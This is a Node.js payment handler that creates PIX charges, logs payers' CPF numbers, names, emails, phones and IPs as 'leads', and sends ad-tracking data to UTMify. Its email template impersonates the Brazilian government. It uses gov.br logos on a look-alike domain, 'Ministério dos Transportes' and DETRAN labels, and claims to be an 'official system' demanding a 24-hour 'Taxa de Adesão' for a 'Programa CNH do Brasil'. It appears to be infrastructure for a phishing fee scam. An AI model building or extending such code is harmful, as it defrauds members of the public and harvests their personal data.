// Blackcat API Integration
// Pagamento via PIX com Blackcat Gateway

const db = require("./_db");
const nodemailer = require("nodemailer");
const QRCode = require("qrcode");

const BASE_URL = process.env.BLACKCAT_BASE_URL || "https://api.blackcatpagamentos.online/api";
const UTMIFY_API_URL = "https://api.utmify.com.br/api-credentials/orders";

function formatUtcDate(date) {
  const iso = new Date(date).toISOString();
  return iso.replace("T", " ").substring(0, 19);
}

function buildTrackingParameters(tracking) {
  const utm = tracking && typeof tracking.utm === "object" && tracking.utm ? tracking.utm : {};
  return {
    src: tracking?.src || utm?.src || null,
    sck: tracking?.sck || utm?.sck || null,
    utm_source: utm?.utm_source || utm?.source || null,
    utm_campaign: utm?.utm_campaign || null,
    utm_medium: utm?.utm_medium || null,
    utm_content: utm?.utm_content || null,
    utm_term: utm?.utm_term || null,
  };
}

function formatCurrencyBRL(cents) {
  const value = Number(cents || 0) / 100;
  return value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
}

let mailTransporterPromise = null;

async function getMailTransporter() {
  const host = process.env.SMTP_HOST;
  const port = Number(process.env.SMTP_PORT || 587);
  const user = process.env.SMTP_USER;
  const pass = process.env.SMTP_PASS;

  if (!host || !user || !pass) return null;
  if (mailTransporterPromise) return mailTransporterPromise;

  mailTransporterPromise = Promise.resolve(
    nodemailer.createTransport({
      host,
      port,
      secure: String(process.env.SMTP_SECURE || "").toLowerCase() === "true" || port === 465,
      auth: { user, pass },
    }),
  );

  return mailTransporterPromise;
}

function buildPixEmailHtml({ nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran }) {
  const amount = formatCurrencyBRL(amountCents);
  const safeTitle = title || "Pagamento PIX";
  const safeName = nome || "Olá";
  const safeTx = transactionId ? `Transação: ${transactionId}` : "";
  const safeCpf = cpf ? String(cpf).replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "";

  const logoUrl = process.env.PIX_EMAIL_LOGO_URL || "https://popseal.vercel.app/cnhzinlogo.png";
  const headerTitle = process.env.PIX_EMAIL_HEADER_TITLE || "Programa CNH do Brasil";
  const headerSubtitle = process.env.PIX_EMAIL_HEADER_SUBTITLE || "Inscrição ativa";
  const headerRightLogo = process.env.PIX_EMAIL_HEADER_RIGHT_LOGO || "https://assets.pogramasenatran.org/govbr-logo.png";
  const buttonLabel = process.env.PIX_EMAIL_BUTTON_LABEL || "REALIZAR PAGAMENTO";
  const detranLabel = detran || process.env.PIX_EMAIL_DETRAN_LABEL || "DETRAN/AC";
  const expiresText = process.env.PIX_EMAIL_EXPIRES_TEXT || "Expira em 24 horas";
  const footerLogo = process.env.PIX_EMAIL_FOOTER_LOGO || "https://assets.pogramasenatran.org/govbr-logo.png";

  return `
  <div style="margin:0; padding:0; background:#e9f1fb; font-family:Arial, Helvetica, sans-serif; color:#0b0b0b; line-height:1.4;">
    <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background:#e9f1fb;">
      <tr>
        <td style="background:#dbe6f5; height:24px; line-height:24px; font-size:0;">&nbsp;</td>
      </tr>
      <tr>
        <td style="background:#e9f1fb; padding:0 12px;">
          <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
            <tr>
              <td align="center">
                <table role="presentation" cellpadding="0" cellspacing="0" width="520" style="max-width:520px; width:100%; background:#ffffff; border-radius:14px; overflow:hidden; box-shadow:0 8px 24px rgba(15, 23, 42, 0.08);">
            <tr>
              <td style="background:#0b2a57; padding:18px 20px;">
                <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                  <tr>
                    <td style="text-align:left;">
                      <img src="${logoUrl}" alt="Logo" style="max-height:36px; display:block;" />
                    </td>
                    <td style="text-align:right;">
                      ${headerRightLogo ? `<img src="${headerRightLogo}" alt="" style="max-height:28px; display:inline-block;" />` : ""}
                    </td>
                  </tr>
                </table>
                <div style="color:#ffffff; font-weight:700; font-size:16px; margin-top:10px;">${headerTitle}</div>
                <div style="color:#9fb5d6; font-size:12px; margin-top:2px;">${headerSubtitle}</div>
              </td>
            </tr>
            <tr>
              <td style="padding:16px 20px 0;">
                <div style="background:#fff5d6; border:1px solid #ffe1a3; color:#6b4b00; padding:10px 12px; border-radius:8px; font-size:12px;">
                  <strong>⚠ Ação necessária, ${safeName}.</strong><br />
                  Sua inscrição aguarda confirmação de pagamento.
                </div>
              </td>
            </tr>
            <tr>
              <td style="padding:16px 20px 6px;">
                <div style="font-size:11px; color:#7a8aa0; letter-spacing:0.4px;">DADOS DO INSCRITO</div>
                <div style="background:#f7f9fc; border:1px solid #e6eef7; padding:12px; border-radius:10px; margin-top:8px;">
                  <div style="font-weight:700; font-size:13px; text-transform:uppercase;">${safeName}</div>
                  <div style="font-size:12px; color:#64748b; margin-top:4px;">
                    ${safeCpf ? `CPF: ${safeCpf}` : ""}${safeCpf ? " · " : ""}${detranLabel}
                  </div>
                </div>
              </td>
            </tr>
            <tr>
              <td style="padding:8px 20px 0;">
                <div style="background:linear-gradient(180deg,#2b5bd8 0%, #1f4fbf 100%); border-radius:12px; padding:18px; text-align:center; color:#ffffff;">
                  <div style="font-size:11px; letter-spacing:0.6px; opacity:0.85;">${safeTitle.toUpperCase()}</div>
                  <div style="font-size:30px; font-weight:700; margin:6px 0 8px;">${amount}</div>
                  <div style="display:inline-block; background:#1e40af; color:#fff; border-radius:999px; padding:4px 10px; font-size:10px;">
                    ⏳ ${expiresText}
                  </div>
                </div>
              </td>
            </tr>
            <tr>
              <td style="padding:14px 20px 0; text-align:center;">
                <a href="#" style="background:#1db954; color:#ffffff; text-decoration:none; padding:12px 18px; border-radius:10px; font-weight:700; display:inline-block; font-size:13px; letter-spacing:0.4px;">
                  ${buttonLabel}
                </a>
                <div style="font-size:11px; color:#64748b; margin-top:8px;">Atenção: pagamento via PIX</div>
              </td>
            </tr>
            <tr>
              <td style="padding:18px 20px 0;">
                <div style="font-weight:700; font-size:12px; color:#0f172a;">Ou copie o código PIX:</div>
                <div style="margin-top:8px; padding:12px; background:#f8fafc; border:1px dashed #cbd5e1; border-radius:10px; font-size:12px; word-break:break-all; color:#1f2937;">${pixCode}</div>
              </td>
            </tr>
            <tr>
              <td style="padding:14px 20px 20px;">
                <div style="background:#e7f8ee; border:1px solid #bfe7d1; border-radius:10px; padding:12px; font-size:12px; color:#0f5132;">
                  <div style="font-weight:700; margin-bottom:6px;">Como pagar via PIX:</div>
                  <ol style="margin:0; padding-left:18px;">
                    <li>Abra o app do seu banco</li>
                    <li>Acesse a área PIX</li>
                    <li>Clique em “Pagar” ou “Copia e Cola”</li>
                    <li>Cole o código e confirme</li>
                  </ol>
                </div>
              </td>
            </tr>
            <tr>
              <td style="background:#0b1b35; padding:18px 20px; text-align:center;">
                <img src="${footerLogo}" alt="" style="max-height:28px; display:block; margin:0 auto 8px;" />
                <div style="color:#cbd5e1; font-size:11px;">Ministério dos Transportes</div>
                <div style="color:#94a3b8; font-size:10px; margin-top:4px;">Governo Federal · União e Reconstrução</div>
                ${safeTx ? `<div style="margin-top:10px; font-size:10px; color:#94a3b8;">Protocolo: ${transactionId}</div>` : ""}
              </td>
            </tr>
            <tr>
              <td style="padding:12px 20px 0; text-align:center; font-size:10px; color:#7b8798;">
                Este email foi enviado pelo sistema oficial do Programa CNH do Brasil.
              </td>
            </tr>
            <tr>
              <td style="padding:6px 20px 18px; text-align:center; font-size:10px; color:#9aa6b2;">
                Em caso de dúvidas, acesse detran.programasnatrans.org
              </td>
            </tr>
                </table>
              </td>
            </tr>
          </table>
        </td>
      </tr>
      <tr>
        <td style="background:#f4f7fb; height:24px; line-height:24px; font-size:0;">&nbsp;</td>
      </tr>
    </table>
  </div>
  `;
}

async function sendPixEmail({ to, nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran }) {
  const transporter = await getMailTransporter();
  if (!to) {
    console.warn("[PAYMENT] Email PIX não enviado: destinatário vazio");
    return false;
  }
  if (!transporter) {
    console.warn("[PAYMENT] Email PIX não enviado: SMTP não configurado");
    return false;
  }

  const from = process.env.SMTP_FROM || process.env.SMTP_USER;
  const replyTo = process.env.SMTP_REPLY_TO || undefined;
  const subject = process.env.PIX_EMAIL_SUBJECT || "Seu PIX foi gerado";

  const html = buildPixEmailHtml({
    nome,
    pixCode,
    qrCode,
    amountCents,
    title,
    transactionId,
    cpf,
    detran,
  });

  const info = await transporter.sendMail({
    from,
    to,
    replyTo,
    subject,
    html,
  });
  console.log("[PAYMENT] Email PIX enviado:", info?.messageId || "ok");
  return true;
}

async function sendUtmifyOrder({
  token,
  orderId,
  status,
  createdAt,
  approvedDate,
  customer,
  products,
  trackingParameters,
  totalPriceInCents,
  gatewayFeeInCents = 0,
  userCommissionInCents,
  paymentMethod = "pix",
  platform = "Blackcat",
}) {
  if (!token) return;
  const payload = {
    orderId: String(orderId),
    platform,
    paymentMethod,
    status,
    createdAt: formatUtcDate(createdAt),
    approvedDate: approvedDate ? formatUtcDate(approvedDate) : null,
    refundedAt: null,
    customer,
    products,
    trackingParameters,
    commission: {
      totalPriceInCents,
      gatewayFeeInCents,
      userCommissionInCents,
    },
    isTest: false,
  };

  try {
    const resp = await fetch(UTMIFY_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-token": token,
      },
      body: JSON.stringify(payload),
    });
    const data = await resp.json().catch(() => ({}));
    if (!resp.ok) {
      console.error("[UTMIFY] Erro ao enviar pedido:", resp.status, data);
    }
  } catch (error) {
    console.error("[UTMIFY] Falha ao enviar pedido:", error.message || error);
  }
}

let leadsTableReady = false;

async function ensureLeadsTable() {
  if (leadsTableReady) return;
  await db.query(
    "CREATE TABLE IF NOT EXISTS leads (" +
      "id SERIAL PRIMARY KEY, " +
      "created_at TIMESTAMPTZ DEFAULT NOW(), " +
      "source TEXT, " +
      "cpf TEXT, " +
      "nome TEXT, " +
      "email TEXT, " +
      "phone TEXT, " +
      "amount_cents INTEGER, " +
      "title TEXT, " +
      "transaction_id TEXT, " +
      "status TEXT, " +
      "tracking TEXT, " +
      "user_agent TEXT, " +
      "ip TEXT" +
    ")",
  );
  await db.query("ALTER TABLE leads ADD COLUMN IF NOT EXISTS status TEXT");
  leadsTableReady = true;
}

async function saveLead(data) {
  if (!db.getConnectionString()) return;
  try {
    await ensureLeadsTable();
    await db.query(
      "INSERT INTO leads (" +
        "source, cpf, nome, email, phone, amount_cents, title, transaction_id, status, tracking, user_agent, ip" +
      ") VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)",
      [
        data.source || "",
        data.cpf || "",
        data.nome || "",
        data.email || "",
        data.phone || "",
        data.amount_cents || null,
        data.title || "",
        data.transaction_id || "",
        data.status || "",
        data.tracking || "",
        data.user_agent || "",
        data.ip || "",
      ],
    );
  } catch (error) {
    console.error("[PAYMENT] Falha ao salvar lead:", error.message);
  }
}

async function handlePaymentRequest(req, res) {
  // Handle OPTIONS
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  try {
    const BLACKCAT_API_KEY = process.env.BLACKCAT_API_KEY;
    const BLACKCAT_POSTBACK_URL = process.env.BLACKCAT_POSTBACK_URL;

    if (!BLACKCAT_API_KEY) {
      return res.status(500).json({
        success: false,
        message: "Credenciais da Blackcat não configuradas",
      });
    }

    if (!BLACKCAT_POSTBACK_URL) {
      return res.status(500).json({
        success: false,
        message: "BLACKCAT_POSTBACK_URL não configurada",
      });
    }

    // Parse body
    let bodyData = req.body;
    if (typeof bodyData === "string") {
      bodyData = JSON.parse(bodyData);
    }

    const { cpf, nome, email, phone, amount, title, description } = bodyData;
    const customerFromBody = bodyData.customer && typeof bodyData.customer === "object"
      ? bodyData.customer
      : null;

    console.log("[PAYMENT] Dados recebidos:", { cpf, nome, email, phone });

    // Validação
    const validCpf = (cpf ?? customerFromBody?.taxId)?.toString().trim();
    const validNome = (nome ?? customerFromBody?.name)?.toString().trim();
    const validEmail = (email ?? customerFromBody?.email)?.toString().trim();
    const validPhone = (phone ?? customerFromBody?.cellphone)?.toString().trim();

    if (!validNome || !validEmail) {
      return res.status(400).json({
        success: false,
        message: "Nome e Email são obrigatórios",
      });
    }

    const FIXED_AMOUNT = amount || process.env.FIXED_AMOUNT || "64.73";
    const FIXED_TITLE = description || title || "Taxa de Adesão";

    const normalizeAmountToCents = (value) => {
      if (value === undefined || value === null || value === "") {
        const parsed = Number(String(FIXED_AMOUNT).replace(",", "."));
        return Math.round(parsed * 100);
      }
      if (typeof value === "string" && (value.includes(",") || value.includes("."))) {
        const parsed = Number(value.replace(",", "."));
        return Math.round(parsed * 100);
      }
      const numeric = Number(value);
      if (!Number.isFinite(numeric)) return 0;
      if (!Number.isInteger(numeric)) {
        return Math.round(numeric * 100);
      }
      // Heurística: valores pequenos (<= 1000) tratamos como reais
      if (numeric <= 1000) return numeric * 100;
      return numeric;
    };

    const amountCents = normalizeAmountToCents(amount);

    if (!amountCents || amountCents < 100) {
      return res.status(400).json({
        success: false,
        message: "Amount inválido (mínimo 100 centavos)",
      });
    }

    const customer = {
      name: customerFromBody?.name || validNome,
      email: customerFromBody?.email || validEmail,
      cellphone: (customerFromBody?.cellphone || validPhone || "").toString().replace(/\D/g, ""),
      taxId: (customerFromBody?.taxId || validCpf || "").toString().replace(/\D/g, ""),
    };

    const trackingFromBody = bodyData.tracking;
    const detranFromBody =
      bodyData.detran ||
      bodyData.detran_label ||
      (bodyData.uf ? `DETRAN/${bodyData.uf}` : "");
    const tracking = (() => {
      if (trackingFromBody && typeof trackingFromBody === "object" && !Array.isArray(trackingFromBody)) {
        const utm = typeof trackingFromBody.utm === "object" && trackingFromBody.utm ? trackingFromBody.utm : {};
        const src = trackingFromBody.src || bodyData.src || req.headers.referer || "";
        return { utm, src };
      }
      if (typeof trackingFromBody === "string") {
        return { utm: {}, src: trackingFromBody };
      }
      const utm = typeof bodyData.utm === "object" && bodyData.utm ? bodyData.utm : {};
      const src = bodyData.src || req.headers.referer || "";
      return { utm, src };
    })();

    const documentType = customer.taxId && customer.taxId.length > 11 ? "cnpj" : "cpf";
    const payload = {
      amount: amountCents,
      currency: "BRL",
      paymentMethod: "pix",
      items: [
        {
          title: FIXED_TITLE,
          unitPrice: amountCents,
          quantity: 1,
          tangible: false,
        },
      ],
      customer: {
        name: customer.name,
        email: customer.email,
        phone: customer.cellphone,
        document: {
          type: documentType,
          number: customer.taxId,
        },
      },
      pix: {
        expiresInDays: 1,
      },
      postbackUrl: BLACKCAT_POSTBACK_URL,
      externalRef: "taxa_adesao",
      metadata: JSON.stringify({
        source: "popseal",
        cpf: customer.taxId,
        email: customer.email,
      }),
      utm_source: tracking?.utm?.utm_source || tracking?.utm?.source || tracking?.src || undefined,
      utm_medium: tracking?.utm?.utm_medium || undefined,
      utm_campaign: tracking?.utm?.utm_campaign || undefined,
      utm_content: tracking?.utm?.utm_content || undefined,
      utm_term: tracking?.utm?.utm_term || undefined,
    };

    const userAgent = bodyData.user_agent || req.headers["user-agent"] || "";

    await saveLead({
      timestamp: new Date().toISOString(),
      source: "payment_request",
      cpf: validCpf || "",
      nome: validNome || "",
      email: validEmail || "",
      phone: validPhone || "",
      amount_cents: amountCents,
      title: FIXED_TITLE,
      tracking: JSON.stringify(tracking || {}),
      user_agent: userAgent,
      ip: req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "",
    });

    console.log("[PAYMENT] Enviando para Blackcat...");

    const resp = await fetch(`${BASE_URL}/sales/create-sale`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        "X-API-Key": BLACKCAT_API_KEY,
      },
      body: JSON.stringify(payload),
    });

    const data = await resp.json().catch(() => ({}));

    if (!resp.ok) {
      console.error("[PAYMENT] Erro Blackcat:", resp.status, data);
      return res.status(502).json({
        success: false,
        message: data?.error || "Falha ao criar PIX",
        detalhes: data?.details || data?.detalhes,
      });
    }

    const txData = Array.isArray(data?.data) ? data.data[0] : data?.data || data;
    const tx = txData?.transactionId || txData?.id || txData?.transaction_id || txData?.txid;
    const paymentData = txData?.paymentData || {};
    const pixText =
      paymentData?.copyPaste ||
      paymentData?.qrCode ||
      txData?.pix_code ||
      txData?.qr_code ||
      "";
    const pixQr =
      paymentData?.qrCodeBase64 ||
      paymentData?.qrCode ||
      txData?.pix_qr_code ||
      txData?.qr_code_image ||
      txData?.qr_code ||
      "";
    const looksLikeBase64 = (value) =>
      typeof value === "string" &&
      value.length > 100 &&
      /^[A-Za-z0-9+/=\s]+$/.test(value);
    const normalizeQrUrl = (value) => {
      if (!value) return value;
      const withScheme = !value.startsWith("http") && value.includes("/")
        ? `https://${value}`
        : value;
      return withScheme.startsWith("http") ? encodeURI(withScheme) : withScheme;
    };
    const pixQrWithPrefix = pixQr
      ? pixQr.startsWith("data:image")
        ? pixQr
        : pixQr.startsWith("http")
          ? pixQr
          : pixQr.startsWith("base64,")
            ? `data:image/png;${pixQr}`
            : looksLikeBase64(pixQr)
              ? `data:image/png;base64,${pixQr.trim()}`
              : normalizeQrUrl(pixQr)
      : "";

    if (!tx || !pixText) {
      return res.status(502).json({
        success: false,
        message: "Gateway não retornou dados esperados",
      });
    }

    await saveLead({
      timestamp: new Date().toISOString(),
      source: "payment_response",
      cpf: validCpf || "",
      nome: validNome || "",
      email: validEmail || "",
      phone: validPhone || "",
      amount_cents: txData?.amount || amountCents,
      title: FIXED_TITLE,
      transaction_id: String(tx),
      status: String(txData?.status || "PENDING"),
    });

    const UTMIFY_API_TOKEN = process.env.UTMIFY_API_TOKEN;
    const customerForUtmify = {
      name: customer.name,
      email: customer.email,
      phone: customer.cellphone || null,
      document: customer.taxId || null,
      country: "BR",
      ip: req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null,
    };
    const productsForUtmify = [
      {
        id: "taxa_adesao",
        name: FIXED_TITLE,
        planId: null,
        planName: null,
        quantity: 1,
        priceInCents: amountCents,
      },
    ];
    const trackingParameters = buildTrackingParameters(tracking || {});

    await sendUtmifyOrder({
      token: UTMIFY_API_TOKEN,
      orderId: String(tx),
      status: "waiting_payment",
      createdAt: new Date(),
      approvedDate: null,
      customer: customerForUtmify,
      products: productsForUtmify,
      trackingParameters,
      totalPriceInCents: amountCents,
      gatewayFeeInCents: 0,
      userCommissionInCents: amountCents,
      paymentMethod: "pix",
      platform: "Blackcat",
    });

    let emailQrCode = pixQrWithPrefix || "";
    if (!emailQrCode && pixText) {
      try {
        emailQrCode = await QRCode.toDataURL(String(pixText));
      } catch (qrError) {
        console.error("[PAYMENT] Falha ao gerar QR Code para email:", qrError.message || qrError);
      }
    }

    try {
      await sendPixEmail({
        to: customer.email,
        nome: customer.name,
        pixCode: String(pixText),
        qrCode: emailQrCode,
        amountCents: txData?.amount || amountCents,
        title: FIXED_TITLE,
        transactionId: String(tx),
        cpf: customer.taxId || "",
        detran: detranFromBody || "",
      });
    } catch (mailError) {
      console.error("[PAYMENT] Falha ao enviar email PIX:", mailError.message || mailError);
    }

    return res.status(200).json({
      success: true,
      transaction_id: String(tx),
      pix_code: String(pixText),
      amount: txData?.amount || amountCents,
      status: String(txData?.status || "PENDING"),
      qr_code: pixQrWithPrefix,
      pix_qr_code: pixQrWithPrefix,
    });

  } catch (error) {
    console.error("[PAYMENT] Erro:", error.message);
    return res.status(500).json({
      success: false,
      message: "Erro interno",
      error: error.message,
    });
  }
}

module.exports = handlePaymentRequest;
